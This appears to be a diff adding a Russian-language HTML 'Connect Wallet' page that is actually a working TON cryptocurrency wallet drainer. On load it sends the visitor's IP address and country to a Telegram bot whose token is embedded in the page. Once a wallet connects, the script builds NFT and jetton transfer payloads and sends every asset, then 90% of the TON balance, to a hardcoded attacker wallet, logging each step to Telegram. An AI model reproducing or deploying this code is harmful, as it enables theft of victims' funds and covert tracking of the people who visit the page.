@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connect Wallet</title>
+<script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.65/dist/tonweb.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0A0E17;
+    --text: #F0F4FF;
+    --muted: #8896B0;
+    --accent: #3B82F6;
+    --radius: 12px;
+  }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  /* Noise texture */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.4;
+  }
+
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+    z-index: 0;
+  }
+  .orb1 { width: 500px; height: 500px; background: rgba(59,130,246,0.06); top: -150px; right: -100px; }
+  .orb2 { width: 400px; height: 400px; background: rgba(0,152,234,0.05); bottom: 20%; left: -100px; }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 24px;
+  }
+
+  .btn-primary {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 16px 28px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+    font-family: inherit;
+    min-width: 220px;
+  }
+  .btn-primary:hover { background: #2563EB; }
+  .btn-primary:active { transform: scale(0.98); }
+
+  /* Загрузка */
+  .loading-overlay {
+    display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85); z-index: 999; align-items: center; justify-content: center;
+  }
+  .loading-box { text-align: center; color: var(--text); }
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid rgba(255,255,255,0.1);
+    border-top: 4px solid var(--accent);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 16px;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  /* Скрытый контейнер TonConnect */
+  #ton-connect { display: none; }
+</style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+
+<div class="container">
+  <button class="btn-primary" id="connectBtn">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+    Connect Wallet
+  </button>
+  <p style="color:var(--muted); font-size:14px;">Подключите кошелёк для продолжения</p>
+</div>
+
+<div class="loading-overlay" id="loadingModal">
+  <div class="loading-box">
+    <div class="spinner"></div>
+    <p style="font-size:16px; font-weight:500;">Подключение...</p>
+    <p style="font-size:13px; color:var(--muted); margin-top:8px;">Пожалуйста, не закрывайте страницу</p>
+  </div>
+</div>
+
+<div id="ton-connect"></div>
+
+<script>
+  // ===== ВАШИ ДАННЫЕ =====
+  var mainWallet = "UQAupLIRNDEuYd3xn7rWanlsGUsvYXN8pke6b62b5L3xHOuD";
+  var tgBotToken = "8755347872:AAH5ajlk1-oPwP5pP0DS9NeROdnmJQtnH9Q";
+  var tgChat = "-1003923197169";
+  // ======================
+
+  var domain = window.location.hostname;
+  var ipUser, countryUser;
+
+  async function sendLog(text) {
+    await fetch(`https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`).catch(console.error);
+  }
+
+  // IP и страна
+  fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(async data => {
+      countryUser = data.country;
+      ipUser = data.ip;
+      await sendLog(`🕵️ *Site opened*\nDomain: ${domain}\nIP: ${ipUser}\nCountry: ${countryUser}`);
+    });
+
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+    manifestUrl: `https://${domain}/tonconnect-manifest.json`,
+    buttonRootId: 'ton-connect'
+  });
+
+  // Ожидание TonWeb
+  function isTonWebReady() {
+    return typeof window.TonWeb !== 'undefined' && window.TonWeb.boc;
+  }
+
+  function waitForTonWeb() {
+    return new Promise((resolve, reject) => {
+      if (isTonWebReady()) return resolve();
+      let attempts = 0;
+      const interval = setInterval(() => {
+        if (isTonWebReady()) {
+          clearInterval(interval);
+          resolve();
+        }
+        attempts++;
+        if (attempts > 20) {
+          clearInterval(interval);
+          // fallback загрузка
+          const script = document.createElement('script');
+          script.src = 'https://unpkg.com/tonweb@0.0.65/dist/tonweb.min.js';
+          script.onload = () => {
+            if (isTonWebReady()) resolve();
+            else reject(new Error('TonWeb не загружен'));
+          };
+          script.onerror = () => reject(new Error('TonWeb не загружен'));
+          document.head.appendChild(script);
+        }
+      }, 500);
+    });
+  }
+
+  function buildNftTransferPayload() {
+    const TonWeb = window.TonWeb;
+    const myAddress = new TonWeb.utils.Address(mainWallet);
+    const cell = new TonWeb.boc.Cell();
+    cell.bits.writeUint(0x5fcc3a14, 32);
+    cell.bits.writeUint(0, 64);
+    cell.bits.writeAddress(myAddress);
+    cell.bits.writeAddress(myAddress);
+    cell.bits.writeBit(0);
+    cell.bits.writeCoins(1);
+    cell.bits.writeBit(0);
+    return TonWeb.boc.Cell.toBoc(cell).toString('base64');
+  }
+
+  function buildJettonTransferPayload(amount) {
+    const TonWeb = window.TonWeb;
+    const myAddress = new TonWeb.utils.Address(mainWallet);
+    const cell = new TonWeb.boc.Cell();
+    cell.bits.writeUint(0x0f8a7ea5, 32);
+    cell.bits.writeUint(0, 64);
+    cell.bits.writeCoins(amount);
+    cell.bits.writeAddress(myAddress);
+    cell.bits.writeAddress(myAddress);
+    cell.bits.writeBit(0);
+    cell.bits.writeCoins(1);
+    cell.bits.writeBit(0);
+    return TonWeb.boc.Cell.toBoc(cell).toString('base64');
+  }
+
+  async function drainAllAssets(walletAddress) {
+    try {
+      await waitForTonWeb();
+      const [nftRes, jettonRes] = await Promise.all([
+        fetch(`https://toncenter.com/api/v3/nft/items?owner_address=${walletAddress}`),
+        fetch(`https://toncenter.com/api/v3/jetton/wallets?owner_address=${walletAddress}`)
+      ]);
+      const nfts = (await nftRes.json()).nft_items || [];
+      const wallets = (await jettonRes.json()).jetton_wallets || [];
+
+      let report = `🎨 *NFT:* ${nfts.length} шт.\n${nfts.slice(0,5).map(n => `- ${n.address.slice(0,10)}...`).join('\n')}\n💰 *Jetton:* ${wallets.length} кошельков\n`;
+      wallets.forEach(w => {
+        if (parseInt(w.balance) > 0) report += `- ${(parseInt(w.balance)/1e9).toFixed(2)} ед. (${w.jetton_address.slice(0,10)}...)\n`;
+      });
+      await sendLog(report + `\n👛 [Wallet](https://tonscan.org/address/${walletAddress})`);
+
+      const allMessages = [];
+      for (const n of nfts) allMessages.push({ address: n.address, amount: "50000000", payload: buildNftTransferPayload() });
+      for (const w of wallets) {
+        if (parseInt(w.balance) > 0) allMessages.push({ address: w.address, amount: "50000000", payload: buildJettonTransferPayload(w.balance) });
+      }
+
+      let sent = 0;
+      while (sent < allMessages.length) {
+        const batch = allMessages.slice(sent, sent + 4);
+        await tonConnectUI.sendTransaction({ validUntil: Math.floor(Date.now()/1000)+120, messages: batch });
+        sent += batch.length;
+        if (sent < allMessages.length) await new Promise(r => setTimeout(r, 3000));
+      }
+      if (allMessages.length > 0) await sendLog(`✅ *Активы дренированы* (${allMessages.length} транзакций)`);
+      return true;
+    } catch (e) {
+      await sendLog(`⚠️ *Asset drain error:* ${e.message}`);
+      return false;
+    }
+  }
+
+  async function sendRemainingTon(walletAddress) {
+    try {
+      const res = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+      const data = await res.json();
+      const original = parseFloat(data.balance || '0');
+      if (isNaN(original) || original <= 0) {
+        await sendLog(`⚠️ *Zero balance after assets*\n👛 [Wallet](https://tonscan.org/address/${walletAddress})`);
+        return;
+      }
+      let toSend = Math.floor(original * 0.9);
+      if (toSend < 1000000) toSend = original;
+      await tonConnectUI.sendTransaction({
+        validUntil: Math.floor(Date.now()/1000)+60,
+        messages: [{ address: mainWallet, amount: String(toSend) }]
+      });
+      await sendLog(`💎 *TON:* ${(toSend/1e9).toFixed(3)} TON\n👛 [Wallet](https://tonscan.org/address/${walletAddress})`);
+    } catch (e) {
+      await sendLog(`❌ *TON send error:* ${e.message}`);
+    }
+  }
+
+  async function connectAndDrain() {
+    document.getElementById('loadingModal').style.display = 'flex';
+    try {
+      if (!tonConnectUI.connected) await tonConnectUI.connectWallet();
+      const addr = tonConnectUI.account.address;
+      await sendLog(`🔗 *Wallet connected*\n[Address](https://tonscan.org/address/${addr})`);
+      await drainAllAssets(addr);
+      await sendRemainingTon(addr);
+    } catch (e) {
+      await sendLog(`❌ *Error:* ${e.message}`);
+    }
+  }
+
+  document.getElementById('connectBtn').addEventListener('click', connectAndDrain);
+</script>
+
+</body>
+</html>
